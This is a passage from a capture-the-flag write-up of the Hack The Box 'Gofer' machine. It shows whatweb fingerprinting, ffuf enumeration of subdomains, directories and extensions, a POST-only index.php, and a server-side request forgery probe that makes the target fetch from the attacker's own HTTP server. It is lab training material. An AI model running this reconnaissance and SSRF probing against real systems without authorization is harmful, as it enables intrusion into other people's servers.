+<div class="highlight"><pre><span></span><span class="nd">@elswix@kali</span><span class="err">$</span> <span class="n">whatweb</span> <span class="o">-</span><span class="n">a</span> <span class="mi">3</span> <span class="mf">10.10.11.225</span>
+<span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="mf">10.10.11.225</span> <span class="p">[</span><span class="mi">301</span> <span class="n">Moved</span> <span class="n">Permanently</span><span class="p">]</span> <span class="n">Apache</span><span class="p">[</span><span class="mf">2.4.56</span><span class="p">],</span> <span class="n">Country</span><span class="p">[</span><span class="n">RESERVED</span><span class="p">][</span><span class="n">ZZ</span><span class="p">],</span> <span class="n">HTTPServer</span><span class="p">[</span><span class="n">Debian</span> <span class="n">Linux</span><span class="p">][</span><span class="n">Apache</span><span class="o">/</span><span class="mf">2.4.56</span> <span class="p">(</span><span class="n">Debian</span><span class="p">)],</span> <span class="n">IP</span><span class="p">[</span><span class="mf">10.10.11.225</span><span class="p">],</span> <span class="n">RedirectLocation</span><span class="p">[</span><span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="n">gofer</span><span class="o">.</span><span class="n">htb</span><span class="o">/</span><span class="p">],</span> <span class="n">Title</span><span class="p">[</span><span class="mi">301</span> <span class="n">Moved</span> <span class="n">Permanently</span><span class="p">]</span>
+<span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="n">gofer</span><span class="o">.</span><span class="n">htb</span><span class="o">/</span> <span class="p">[</span><span class="mi">200</span> <span class="n">OK</span><span class="p">]</span> <span class="n">Apache</span><span class="p">[</span><span class="mf">2.4.56</span><span class="p">],</span> <span class="n">Bootstrap</span><span class="p">,</span> <span class="n">Country</span><span class="p">[</span><span class="n">RESERVED</span><span class="p">][</span><span class="n">ZZ</span><span class="p">],</span> <span class="n">Email</span><span class="p">[</span><span class="n">info</span><span class="nd">@gofer</span><span class="o">.</span><span class="n">htb</span><span class="p">],</span> <span class="n">Frame</span><span class="p">,</span> <span class="n">HTML5</span><span class="p">,</span> <span class="n">HTTPServer</span><span class="p">[</span><span class="n">Debian</span> <span class="n">Linux</span><span class="p">][</span><span class="n">Apache</span><span class="o">/</span><span class="mf">2.4.56</span> <span class="p">(</span><span class="n">Debian</span><span class="p">)],</span> <span class="n">IP</span><span class="p">[</span><span class="mf">10.10.11.225</span><span class="p">],</span> <span class="n">Lightbox</span><span class="p">,</span> <span class="n">Script</span><span class="p">,</span> <span class="n">Title</span><span class="p">[</span><span class="n">Gofer</span><span class="p">]</span>
+</pre></div>
+
+Since there isn't any significant information available, let's access the website through our browser:<br/><br/>
+<img alt="" src="https://elswix.github.io/writeups/htb/hard/gofer/img/2.png"/><br/><br/>
+After spending some time browsing the site, I haven't come across anything noteworthy.<br/><br/>
+<h3><br>Subdomain Enumeration</br></h3><br>
+We'll proceed to enumerate subdomains using <code>ffuf</code>:<br/><br/>
+<div class="highlight"><pre><span></span><span class="nd">@elswix@kali</span><span class="err">$</span> <span class="n">ffuf</span> <span class="o">-</span><span class="n">c</span> <span class="o">-</span><span class="n">t</span> <span class="mi">100</span> <span class="o">-</span><span class="n">w</span> <span class="o">/</span><span class="n">opt</span><span class="o">/</span><span class="n">seclists</span><span class="o">/</span><span class="n">Discovery</span><span class="o">/</span><span class="n">DNS</span><span class="o">/</span><span class="n">subdomains</span><span class="o">-</span><span class="n">top1million</span><span class="o">-</span><span class="mf">5000.</span><span class="n">txt</span> <span class="o">-</span><span class="n">u</span> <span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="n">gofer</span><span class="o">.</span><span class="n">htb</span> <span class="o">-</span><span class="n">H</span> <span class="s2">"Host: FUZZ.gofer.htb"</span> <span class="o">--</span><span class="n">fw</span><span class="o">=</span><span class="mi">20</span>
+
+        <span class="o">/</span><span class="s1">'___\  /'</span><span class="n">___</span>\           <span class="o">/</span><span class="s1">'___\       </span>
+       <span class="o">/</span>\ \<span class="n">__</span><span class="o">/</span> <span class="o">/</span>\ \<span class="n">__</span><span class="o">/</span>  <span class="n">__</span>  <span class="n">__</span>  <span class="o">/</span>\ \<span class="n">__</span><span class="o">/</span>       
+       \ \ <span class="p">,</span><span class="n">__</span>\\ \ <span class="p">,</span><span class="n">__</span>\<span class="o">/</span>\ \<span class="o">/</span>\ \ \ \ <span class="p">,</span><span class="n">__</span>\      
+        \ \ \<span class="n">_</span><span class="o">/</span> \ \ \<span class="n">_</span><span class="o">/</span>\ \ \<span class="n">_</span>\ \ \ \ \<span class="n">_</span><span class="o">/</span>      
+         \ \<span class="n">_</span>\   \ \<span class="n">_</span>\  \ \<span class="n">____</span><span class="o">/</span>  \ \<span class="n">_</span>\       
+          \<span class="o">/</span><span class="n">_</span><span class="o">/</span>    \<span class="o">/</span><span class="n">_</span><span class="o">/</span>   \<span class="o">/</span><span class="n">___</span><span class="o">/</span>    \<span class="o">/</span><span class="n">_</span><span class="o">/</span>       
+
+       <span class="n">v2</span><span class="mf">.1.0</span><span class="o">-</span><span class="n">dev</span>
+<span class="n">________________________________________________</span>
+
+ <span class="p">::</span> <span class="n">Method</span>           <span class="p">:</span> <span class="n">GET</span>
+ <span class="p">::</span> <span class="n">URL</span>              <span class="p">:</span> <span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="n">gofer</span><span class="o">.</span><span class="n">htb</span>
+ <span class="p">::</span> <span class="n">Wordlist</span>         <span class="p">:</span> <span class="n">FUZZ</span><span class="p">:</span> <span class="o">/</span><span class="n">opt</span><span class="o">/</span><span class="n">seclists</span><span class="o">/</span><span class="n">Discovery</span><span class="o">/</span><span class="n">DNS</span><span class="o">/</span><span class="n">subdomains</span><span class="o">-</span><span class="n">top1million</span><span class="o">-</span><span class="mf">5000.</span><span class="n">txt</span>
+ <span class="p">::</span> <span class="n">Header</span>           <span class="p">:</span> <span class="n">Host</span><span class="p">:</span> <span class="n">FUZZ</span><span class="o">.</span><span class="n">gofer</span><span class="o">.</span><span class="n">htb</span>
+ <span class="p">::</span> <span class="n">Follow</span> <span class="n">redirects</span> <span class="p">:</span> <span class="n">false</span>
+ <span class="p">::</span> <span class="n">Calibration</span>      <span class="p">:</span> <span class="n">false</span>
+ <span class="p">::</span> <span class="n">Timeout</span>          <span class="p">:</span> <span class="mi">10</span>
+ <span class="p">::</span> <span class="n">Threads</span>          <span class="p">:</span> <span class="mi">100</span>
+ <span class="p">::</span> <span class="n">Matcher</span>          <span class="p">:</span> <span class="n">Response</span> <span class="n">status</span><span class="p">:</span> <span class="mi">200</span><span class="o">-</span><span class="mi">299</span><span class="p">,</span><span class="mi">301</span><span class="p">,</span><span class="mi">302</span><span class="p">,</span><span class="mi">307</span><span class="p">,</span><span class="mi">401</span><span class="p">,</span><span class="mi">403</span><span class="p">,</span><span class="mi">405</span><span class="p">,</span><span class="mi">500</span>
+ <span class="p">::</span> <span class="n">Filter</span>           <span class="p">:</span> <span class="n">Response</span> <span class="n">words</span><span class="p">:</span> <span class="mi">20</span>
+<span class="n">________________________________________________</span>
+
+<span class="n">proxy</span>                   <span class="p">[</span><span class="n">Status</span><span class="p">:</span> <span class="mi">401</span><span class="p">,</span> <span class="n">Size</span><span class="p">:</span> <span class="mi">462</span><span class="p">,</span> <span class="n">Words</span><span class="p">:</span> <span class="mi">42</span><span class="p">,</span> <span class="n">Lines</span><span class="p">:</span> <span class="mi">15</span><span class="p">,</span> <span class="n">Duration</span><span class="p">:</span> <span class="mi">3924</span><span class="n">ms</span><span class="p">]</span>
+
+<span class="p">::</span> <span class="n">Progress</span><span class="p">:</span> <span class="p">[</span><span class="mi">4989</span><span class="o">/</span><span class="mi">4989</span><span class="p">]</span> <span class="p">::</span> <span class="n">Job</span> <span class="p">[</span><span class="mi">1</span><span class="o">/</span><span class="mi">1</span><span class="p">]</span> <span class="p">::</span> <span class="mi">140</span> <span class="n">req</span><span class="o">/</span><span class="n">sec</span> <span class="p">::</span> <span class="n">Duration</span><span class="p">:</span> <span class="p">[</span><span class="mi">0</span><span class="p">:</span><span class="mi">00</span><span class="p">:</span><span class="mi">54</span><span class="p">]</span> <span class="p">::</span> <span class="n">Errors</span><span class="p">:</span> <span class="mi">0</span> <span class="p">::</span>
+</pre></div>
+
+It has discovered the <code>proxy.gofer.htb</code> subdomain. We'll need to add it to our <code>/etc/hosts</code> file, pointing it to the victim machine's IP address.<br/><br/>
+<div class="highlight"><pre><span></span><span class="nd">@elswix@kali</span><span class="err">$</span> <span class="n">cat</span> <span class="o">/</span><span class="n">etc</span><span class="o">/</span><span class="n">hosts</span>
+<span class="mf">127.0.0.1</span>   <span class="n">localhost</span>
+<span class="mf">127.0.1.1</span>   <span class="n">kali</span><span class="o">.</span><span class="n">localhost</span> <span class="n">kali</span>
+
+<span class="c1"># The following lines are desirable for IPv6 capable hosts</span>
+<span class="p">::</span><span class="mi">1</span>     <span class="n">localhost</span> <span class="n">ip6</span><span class="o">-</span><span class="n">localhost</span> <span class="n">ip6</span><span class="o">-</span><span class="n">loopback</span>
+<span class="n">ff02</span><span class="p">::</span><span class="mi">1</span> <span class="n">ip6</span><span class="o">-</span><span class="n">allnodes</span>
+<span class="n">ff02</span><span class="p">::</span><span class="mi">2</span> <span class="n">ip6</span><span class="o">-</span><span class="n">allrouters</span>
+
+<span class="c1"># HackTheBox</span>
+<span class="mf">10.10.11.225</span> <span class="n">gofer</span><span class="o">.</span><span class="n">htb</span> <span class="n">proxy</span><span class="o">.</span><span class="n">gofer</span><span class="o">.</span><span class="n">htb</span>
+</pre></div>
+
+When attempting to access <code>proxy.gofer.htb</code>, it returns a status code 401 (unauthorized), prompting us for credentials. As we currently lack valid credentials, access is restricted.<br/><br/>
+While we might not have access to the main page, we can potentially access other directories or files. Since we lack information regarding directories or files, let's initiate a fuzzing process.<br/><br/>
+Once again, utilizing <a href="https://chat.openai.com/c/b205d15b-2d64-46fa-b74c-9e791689c93f">ffuf</a>, we'll conceal the 401 status code:<br/><br/>
+<div class="highlight"><pre><span></span><span class="nd">@elswix@kali</span><span class="err">$</span> <span class="n">ffuf</span> <span class="o">-</span><span class="n">c</span> <span class="o">-</span><span class="n">t</span> <span class="mi">100</span> <span class="o">-</span><span class="n">w</span> <span class="o">/</span><span class="n">opt</span><span class="o">/</span><span class="n">seclists</span><span class="o">/</span><span class="n">Discovery</span><span class="o">/</span><span class="n">Web</span><span class="o">-</span><span class="n">Content</span><span class="o">/</span><span class="n">directory</span><span class="o">-</span><span class="nb">list</span><span class="o">-</span><span class="mf">2.3</span><span class="o">-</span><span class="n">medium</span><span class="o">.</span><span class="n">txt</span> <span class="o">-</span><span class="n">u</span> <span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="n">proxy</span><span class="o">.</span><span class="n">gofer</span><span class="o">.</span><span class="n">htb</span><span class="o">/</span><span class="n">FUZZ</span> <span class="o">--</span><span class="n">fc</span><span class="o">=</span><span class="mi">401</span>
+
+        <span class="o">/</span><span class="s1">'___\  /'</span><span class="n">___</span>\           <span class="o">/</span><span class="s1">'___\       </span>
+       <span class="o">/</span>\ \<span class="n">__</span><span class="o">/</span> <span class="o">/</span>\ \<span class="n">__</span><span class="o">/</span>  <span class="n">__</span>  <span class="n">__</span>  <span class="o">/</span>\ \<span class="n">__</span><span class="o">/</span>       
+       \ \ <span class="p">,</span><span class="n">__</span>\\ \ <span class="p">,</span><span class="n">__</span>\<span class="o">/</span>\ \<span class="o">/</span>\ \ \ \ <span class="p">,</span><span class="n">__</span>\      
+        \ \ \<span class="n">_</span><span class="o">/</span> \ \ \<span class="n">_</span><span class="o">/</span>\ \ \<span class="n">_</span>\ \ \ \ \<span class="n">_</span><span class="o">/</span>      
+         \ \<span class="n">_</span>\   \ \<span class="n">_</span>\  \ \<span class="n">____</span><span class="o">/</span>  \ \<span class="n">_</span>\       
+          \<span class="o">/</span><span class="n">_</span><span class="o">/</span>    \<span class="o">/</span><span class="n">_</span><span class="o">/</span>   \<span class="o">/</span><span class="n">___</span><span class="o">/</span>    \<span class="o">/</span><span class="n">_</span><span class="o">/</span>       
+
+       <span class="n">v2</span><span class="mf">.1.0</span><span class="o">-</span><span class="n">dev</span>
+<span class="n">________________________________________________</span>
+
+ <span class="p">::</span> <span class="n">Method</span>           <span class="p">:</span> <span class="n">GET</span>
+ <span class="p">::</span> <span class="n">URL</span>              <span class="p">:</span> <span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="n">proxy</span><span class="o">.</span><span class="n">gofer</span><span class="o">.</span><span class="n">htb</span><span class="o">/</span><span class="n">FUZZ</span>
+ <span class="p">::</span> <span class="n">Wordlist</span>         <span class="p">:</span> <span class="n">FUZZ</span><span class="p">:</span> <span class="o">/</span><span class="n">opt</span><span class="o">/</span><span class="n">seclists</span><span class="o">/</span><span class="n">Discovery</span><span class="o">/</span><span class="n">Web</span><span class="o">-</span><span class="n">Content</span><span class="o">/</span><span class="n">directory</span><span class="o">-</span><span class="nb">list</span><span class="o">-</span><span class="mf">2.3</span><span class="o">-</span><span class="n">medium</span><span class="o">.</span><span class="n">txt</span>
+ <span class="p">::</span> <span class="n">Follow</span> <span class="n">redirects</span> <span class="p">:</span> <span class="n">false</span>
+ <span class="p">::</span> <span class="n">Calibration</span>      <span class="p">:</span> <span class="n">false</span>
+ <span class="p">::</span> <span class="n">Timeout</span>          <span class="p">:</span> <span class="mi">10</span>
+ <span class="p">::</span> <span class="n">Threads</span>          <span class="p">:</span> <span class="mi">100</span>
+ <span class="p">::</span> <span class="n">Matcher</span>          <span class="p">:</span> <span class="n">Response</span> <span class="n">status</span><span class="p">:</span> <span class="mi">200</span><span class="o">-</span><span class="mi">299</span><span class="p">,</span><span class="mi">301</span><span class="p">,</span><span class="mi">302</span><span class="p">,</span><span class="mi">307</span><span class="p">,</span><span class="mi">401</span><span class="p">,</span><span class="mi">403</span><span class="p">,</span><span class="mi">405</span><span class="p">,</span><span class="mi">500</span>
+ <span class="p">::</span> <span class="n">Filter</span>           <span class="p">:</span> <span class="n">Response</span> <span class="n">status</span><span class="p">:</span> <span class="mi">401</span>
+<span class="n">________________________________________________</span>
+
+<span class="p">[</span><span class="n">WARN</span><span class="p">]</span> <span class="n">Caught</span> <span class="n">keyboard</span> <span class="n">interrupt</span> <span class="p">(</span><span class="n">Ctrl</span><span class="o">-</span><span class="n">C</span><span class="p">)</span>
+</pre></div>
+
+I ran the process for 5 minutes, but unfortunately, it didn't yield any results, so I stopped it.<br/><br/>
+Now, I'll proceed to fuzz files with extensions such as php, html, js, etc.<br/><br/>
+I've created an <code>extensions.txt</code> file with the following content:<br/><br/>
+<div class="highlight"><pre><span></span><span class="nd">@elswix@kali</span><span class="err">$</span> <span class="n">cat</span> <span class="n">extensions</span><span class="o">.</span><span class="n">txt</span>
+<span class="n">php</span>
+<span class="n">html</span>
+<span class="n">js</span>
+<span class="n">txt</span>
+</pre></div>
+
+So, let's execute <code>ffuf</code> using two wordlists:<br/><br/>
+<div class="highlight"><pre><span></span><span class="nd">@elswix@kali</span><span class="err">$</span> <span class="n">ffuf</span> <span class="o">-</span><span class="n">c</span> <span class="o">-</span><span class="n">t</span> <span class="mi">50</span> <span class="o">-</span><span class="n">w</span> <span class="o">/</span><span class="n">opt</span><span class="o">/</span><span class="n">seclists</span><span class="o">/</span><span class="n">Discovery</span><span class="o">/</span><span class="n">Web</span><span class="o">-</span><span class="n">Content</span><span class="o">/</span><span class="n">directory</span><span class="o">-</span><span class="nb">list</span><span class="o">-</span><span class="mf">2.3</span><span class="o">-</span><span class="n">medium</span><span class="o">.</span><span class="n">txt</span><span class="p">:</span><span class="n">FUZZ</span> <span class="o">-</span><span class="n">w</span> <span class="n">extensions</span><span class="o">.</span><span class="n">txt</span><span class="p">:</span><span class="n">EXTENSIONS</span> <span class="o">-</span><span class="n">u</span> <span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="n">proxy</span><span class="o">.</span><span class="n">gofer</span><span class="o">.</span><span class="n">htb</span><span class="o">/</span><span class="n">FUZZ</span><span class="o">.</span><span class="n">EXTENSIONS</span> <span class="o">--</span><span class="n">fc</span><span class="o">=</span><span class="mi">401</span>
+
+        <span class="o">/</span><span class="s1">'___\  /'</span><span class="n">___</span>\           <span class="o">/</span><span class="s1">'___\       </span>
+       <span class="o">/</span>\ \<span class="n">__</span><span class="o">/</span> <span class="o">/</span>\ \<span class="n">__</span><span class="o">/</span>  <span class="n">__</span>  <span class="n">__</span>  <span class="o">/</span>\ \<span class="n">__</span><span class="o">/</span>       
+       \ \ <span class="p">,</span><span class="n">__</span>\\ \ <span class="p">,</span><span class="n">__</span>\<span class="o">/</span>\ \<span class="o">/</span>\ \ \ \ <span class="p">,</span><span class="n">__</span>\      
+        \ \ \<span class="n">_</span><span class="o">/</span> \ \ \<span class="n">_</span><span class="o">/</span>\ \ \<span class="n">_</span>\ \ \ \ \<span class="n">_</span><span class="o">/</span>      
+         \ \<span class="n">_</span>\   \ \<span class="n">_</span>\  \ \<span class="n">____</span><span class="o">/</span>  \ \<span class="n">_</span>\       
+          \<span class="o">/</span><span class="n">_</span><span class="o">/</span>    \<span class="o">/</span><span class="n">_</span><span class="o">/</span>   \<span class="o">/</span><span class="n">___</span><span class="o">/</span>    \<span class="o">/</span><span class="n">_</span><span class="o">/</span>       
+
+       <span class="n">v2</span><span class="mf">.1.0</span><span class="o">-</span><span class="n">dev</span>
+<span class="n">________________________________________________</span>
+
+ <span class="p">::</span> <span class="n">Method</span>           <span class="p">:</span> <span class="n">GET</span>
+ <span class="p">::</span> <span class="n">URL</span>              <span class="p">:</span> <span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="n">proxy</span><span class="o">.</span><span class="n">gofer</span><span class="o">.</span><span class="n">htb</span><span class="o">/</span><span class="n">FUZZ</span><span class="o">.</span><span class="n">EXTENSIONS</span>
+ <span class="p">::</span> <span class="n">Wordlist</span>         <span class="p">:</span> <span class="n">FUZZ</span><span class="p">:</span> <span class="o">/</span><span class="n">opt</span><span class="o">/</span><span class="n">seclists</span><span class="o">/</span><span class="n">Discovery</span><span class="o">/</span><span class="n">Web</span><span class="o">-</span><span class="n">Content</span><span class="o">/</span><span class="n">directory</span><span class="o">-</span><span class="nb">list</span><span class="o">-</span><span class="mf">2.3</span><span class="o">-</span><span class="n">medium</span><span class="o">.</span><span class="n">txt</span>
+ <span class="p">::</span> <span class="n">Wordlist</span>         <span class="p">:</span> <span class="n">EXTENSIONS</span><span class="p">:</span> <span class="o">/</span><span class="n">home</span><span class="o">/</span><span class="n">elswix</span><span class="o">/</span><span class="n">Desktop</span><span class="o">/</span><span class="n">elswix</span><span class="o">/</span><span class="n">HTB</span><span class="o">/</span><span class="n">Gofer</span><span class="o">/</span><span class="n">content</span><span class="o">/</span><span class="n">extensions</span><span class="o">.</span><span class="n">txt</span>
+ <span class="p">::</span> <span class="n">Follow</span> <span class="n">redirects</span> <span class="p">:</span> <span class="n">false</span>
+ <span class="p">::</span> <span class="n">Calibration</span>      <span class="p">:</span> <span class="n">false</span>
+ <span class="p">::</span> <span class="n">Timeout</span>          <span class="p">:</span> <span class="mi">10</span>
+ <span class="p">::</span> <span class="n">Threads</span>          <span class="p">:</span> <span class="mi">50</span>
+ <span class="p">::</span> <span class="n">Matcher</span>          <span class="p">:</span> <span class="n">Response</span> <span class="n">status</span><span class="p">:</span> <span class="mi">200</span><span class="o">-</span><span class="mi">299</span><span class="p">,</span><span class="mi">301</span><span class="p">,</span><span class="mi">302</span><span class="p">,</span><span class="mi">307</span><span class="p">,</span><span class="mi">401</span><span class="p">,</span><span class="mi">403</span><span class="p">,</span><span class="mi">405</span><span class="p">,</span><span class="mi">500</span>
+ <span class="p">::</span> <span class="n">Filter</span>           <span class="p">:</span> <span class="n">Response</span> <span class="n">status</span><span class="p">:</span> <span class="mi">401</span>
+<span class="n">________________________________________________</span>
+
+<span class="p">[</span><span class="n">WARN</span><span class="p">]</span> <span class="n">Caught</span> <span class="n">keyboard</span> <span class="n">interrupt</span> <span class="p">(</span><span class="n">Ctrl</span><span class="o">-</span><span class="n">C</span><span class="p">)</span>
+</pre></div>
+
+The scan didn't yield any results, so I terminated it. To explore further, I'm considering making requests using the POST method. Sometimes, certain sections of web pages remain inaccessible via the GET method, yet can be accessed or manipulated through the POST method.<br/><br/>
+Once again, using <code>ffuf</code>, I'll initiate a similar scan but this time using the <code>-X POST</code> parameter to specify that all requests should be made using the POST method.<br/><br/>
+<div class="highlight"><pre><span></span><span class="nd">@elswix@kali</span><span class="err">$</span> <span class="n">ffuf</span> <span class="o">-</span><span class="n">c</span> <span class="o">-</span><span class="n">t</span> <span class="mi">50</span> <span class="o">-</span><span class="n">w</span> <span class="o">/</span><span class="n">opt</span><span class="o">/</span><span class="n">seclists</span><span class="o">/</span><span class="n">Discovery</span><span class="o">/</span><span class="n">Web</span><span class="o">-</span><span class="n">Content</span><span class="o">/</span><span class="n">directory</span><span class="o">-</span><span class="nb">list</span><span class="o">-</span><span class="mf">2.3</span><span class="o">-</span><span class="n">medium</span><span class="o">.</span><span class="n">txt</span><span class="p">:</span><span class="n">FUZZ</span> <span class="o">-</span><span class="n">w</span> <span class="n">extensions</span><span class="o">.</span><span class="n">txt</span><span class="p">:</span><span class="n">EXTENSIONS</span> <span class="o">-</span><span class="n">u</span> <span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="n">proxy</span><span class="o">.</span><span class="n">gofer</span><span class="o">.</span><span class="n">htb</span><span class="o">/</span><span class="n">FUZZ</span><span class="o">.</span><span class="n">EXTENSIONS</span> <span class="o">--</span><span class="n">fc</span><span class="o">=</span><span class="mi">401</span> <span class="o">-</span><span class="n">X</span> <span class="n">POST</span>
+
+        <span class="o">/</span><span class="s1">'___\  /'</span><span class="n">___</span>\           <span class="o">/</span><span class="s1">'___\       </span>
+       <span class="o">/</span>\ \<span class="n">__</span><span class="o">/</span> <span class="o">/</span>\ \<span class="n">__</span><span class="o">/</span>  <span class="n">__</span>  <span class="n">__</span>  <span class="o">/</span>\ \<span class="n">__</span><span class="o">/</span>       
+       \ \ <span class="p">,</span><span class="n">__</span>\\ \ <span class="p">,</span><span class="n">__</span>\<span class="o">/</span>\ \<span class="o">/</span>\ \ \ \ <span class="p">,</span><span class="n">__</span>\      
+        \ \ \<span class="n">_</span><span class="o">/</span> \ \ \<span class="n">_</span><span class="o">/</span>\ \ \<span class="n">_</span>\ \ \ \ \<span class="n">_</span><span class="o">/</span>      
+         \ \<span class="n">_</span>\   \ \<span class="n">_</span>\  \ \<span class="n">____</span><span class="o">/</span>  \ \<span class="n">_</span>\       
+          \<span class="o">/</span><span class="n">_</span><span class="o">/</span>    \<span class="o">/</span><span class="n">_</span><span class="o">/</span>   \<span class="o">/</span><span class="n">___</span><span class="o">/</span>    \<span class="o">/</span><span class="n">_</span><span class="o">/</span>       
+
+       <span class="n">v2</span><span class="mf">.1.0</span><span class="o">-</span><span class="n">dev</span>
+<span class="n">________________________________________________</span>
+
+ <span class="p">::</span> <span class="n">Method</span>           <span class="p">:</span> <span class="n">POST</span>
+ <span class="p">::</span> <span class="n">URL</span>              <span class="p">:</span> <span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="n">proxy</span><span class="o">.</span><span class="n">gofer</span><span class="o">.</span><span class="n">htb</span><span class="o">/</span><span class="n">FUZZ</span><span class="o">.</span><span class="n">EXTENSIONS</span>
+ <span class="p">::</span> <span class="n">Wordlist</span>         <span class="p">:</span> <span class="n">FUZZ</span><span class="p">:</span> <span class="o">/</span><span class="n">opt</span><span class="o">/</span><span class="n">seclists</span><span class="o">/</span><span class="n">Discovery</span><span class="o">/</span><span class="n">Web</span><span class="o">-</span><span class="n">Content</span><span class="o">/</span><span class="n">directory</span><span class="o">-</span><span class="nb">list</span><span class="o">-</span><span class="mf">2.3</span><span class="o">-</span><span class="n">medium</span><span class="o">.</span><span class="n">txt</span>
+ <span class="p">::</span> <span class="n">Wordlist</span>         <span class="p">:</span> <span class="n">EXTENSIONS</span><span class="p">:</span> <span class="o">/</span><span class="n">home</span><span class="o">/</span><span class="n">elswix</span><span class="o">/</span><span class="n">Desktop</span><span class="o">/</span><span class="n">elswix</span><span class="o">/</span><span class="n">HTB</span><span class="o">/</span><span class="n">Gofer</span><span class="o">/</span><span class="n">content</span><span class="o">/</span><span class="n">extensions</span><span class="o">.</span><span class="n">txt</span>
+ <span class="p">::</span> <span class="n">Follow</span> <span class="n">redirects</span> <span class="p">:</span> <span class="n">false</span>
+ <span class="p">::</span> <span class="n">Calibration</span>      <span class="p">:</span> <span class="n">false</span>
+ <span class="p">::</span> <span class="n">Timeout</span>          <span class="p">:</span> <span class="mi">10</span>
+ <span class="p">::</span> <span class="n">Threads</span>          <span class="p">:</span> <span class="mi">50</span>
+ <span class="p">::</span> <span class="n">Matcher</span>          <span class="p">:</span> <span class="n">Response</span> <span class="n">status</span><span class="p">:</span> <span class="mi">200</span><span class="o">-</span><span class="mi">299</span><span class="p">,</span><span class="mi">301</span><span class="p">,</span><span class="mi">302</span><span class="p">,</span><span class="mi">307</span><span class="p">,</span><span class="mi">401</span><span class="p">,</span><span class="mi">403</span><span class="p">,</span><span class="mi">405</span><span class="p">,</span><span class="mi">500</span>
+ <span class="p">::</span> <span class="n">Filter</span>           <span class="p">:</span> <span class="n">Response</span> <span class="n">status</span><span class="p">:</span> <span class="mi">401</span>
+<span class="n">________________________________________________</span>
+
+<span class="p">[</span><span class="n">Status</span><span class="p">:</span> <span class="mi">200</span><span class="p">,</span> <span class="n">Size</span><span class="p">:</span> <span class="mi">81</span><span class="p">,</span> <span class="n">Words</span><span class="p">:</span> <span class="mi">9</span><span class="p">,</span> <span class="n">Lines</span><span class="p">:</span> <span class="mi">2</span><span class="p">,</span> <span class="n">Duration</span><span class="p">:</span> <span class="mi">401</span><span class="n">ms</span><span class="p">]</span>
+    <span class="o">*</span> <span class="n">EXTENSIONS</span><span class="p">:</span> <span class="n">php</span>
+    <span class="o">*</span> <span class="n">FUZZ</span><span class="p">:</span> <span class="n">index</span>
+
+<span class="p">[</span><span class="n">WARN</span><span class="p">]</span> <span class="n">Caught</span> <span class="n">keyboard</span> <span class="n">interrupt</span> <span class="p">(</span><span class="n">Ctrl</span><span class="o">-</span><span class="n">C</span><span class="p">)</span>
+</pre></div>
+
+It discovered an <code>index.php</code> file accessible through POST requests.<br/><br/>
+Upon using curl to make a POST Request to <code>http://proxy.gofer.htb</code>, it returns the following message:<br/><br/>
+<div class="highlight"><pre><span></span><span class="nd">@elswix@kali</span><span class="err">$</span> <span class="n">curl</span> <span class="o">-</span><span class="n">s</span> <span class="o">-</span><span class="n">X</span> <span class="n">POST</span> <span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="n">proxy</span><span class="o">.</span><span class="n">gofer</span><span class="o">.</span><span class="n">htb</span><span class="o">/</span><span class="n">index</span><span class="o">.</span><span class="n">php</span>
+<span class="o">&lt;</span><span class="err">!</span><span class="o">--</span> <span class="n">Welcome</span> <span class="n">to</span> <span class="n">Gofer</span> <span class="n">proxy</span> <span class="o">--&gt;</span>
+<span class="o">&lt;</span><span class="n">html</span><span class="o">&gt;&lt;</span><span class="n">body</span><span class="o">&gt;</span><span class="n">Missing</span> <span class="n">URL</span> <span class="n">parameter</span> <span class="err">!</span><span class="o">&lt;/</span><span class="n">body</span><span class="o">&gt;&lt;/</span><span class="n">html</span><span class="o">&gt;%</span>
+</pre></div>
+
+It indicates a missing URL parameter, so I'll specify it in the URL:<br/><br/>
+<div class="highlight"><pre><span></span><span class="nd">@elswix@kali</span><span class="err">$</span> <span class="n">curl</span> <span class="o">-</span><span class="n">s</span> <span class="o">-</span><span class="n">X</span> <span class="n">POST</span> <span class="s1">'http://proxy.gofer.htb/index.php?url=TEST'</span>
+</pre></div>
+
+It's not generating any output. It seems to attempt access to the URL specified in the URL parameter.<br/><br/>
+I'll set up an HTTP Server on my attacker machine. First, I need to create the HTTP Server:<br/><br/>
+<div class="highlight"><pre><span></span><span class="nd">@elswix@kali</span><span class="err">$</span> <span class="n">python3</span> <span class="o">-</span><span class="n">m</span> <span class="n">http</span><span class="o">.</span><span class="n">server</span> <span class="mi">80</span>
+<span class="n">Serving</span> <span class="n">HTTP</span> <span class="n">on</span> <span class="mf">0.0.0.0</span> <span class="n">port</span> <span class="mi">80</span> <span class="p">(</span><span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="mf">0.0.0.0</span><span class="p">:</span><span class="mi">80</span><span class="o">/</span><span class="p">)</span> <span class="o">...</span>
+</pre></div>
+
+Now, let's send the request:<br/><br/>
+<div class="highlight"><pre><span></span><span class="nd">@elswix@kali</span><span class="err">$</span> <span class="n">curl</span> <span class="o">-</span><span class="n">s</span> <span class="o">-</span><span class="n">X</span> <span class="n">POST</span> <span class="s1">'http://proxy.gofer.htb/index.php?url=http://10.10.16.7'</span>
+<span class="o">&lt;</span><span class="err">!</span><span class="o">--</span> <span class="n">Welcome</span> <span class="n">to</span> <span class="n">Gofer</span> <span class="n">proxy</span> <span class="o">--&gt;</span>
+<span class="o">&lt;</span><span class="err">!</span><span class="n">DOCTYPE</span> <span class="n">HTML</span><span class="o">&gt;</span>
+<span class="o">&lt;</span><span class="n">html</span> <span class="n">lang</span><span class="o">=</span><span class="s2">"en"</span><span class="o">&gt;</span>
+<span class="o">&lt;</span><span class="n">head</span><span class="o">&gt;</span>
+<span class="o">&lt;</span><span class="n">meta</span> <span class="n">charset</span><span class="o">=</span><span class="s2">"utf-8"</span><span class="o">&gt;</span>
+<span class="o">&lt;</span><span class="n">title</span><span class="o">&gt;</span><span class="n">Directory</span> <span class="n">listing</span> <span class="k">for</span> <span class="o">/&lt;/</span><span class="n">title</span><span class="o">&gt;</span>
+<span class="o">&lt;/</span><span class="n">head</span><span class="o">&gt;</span>
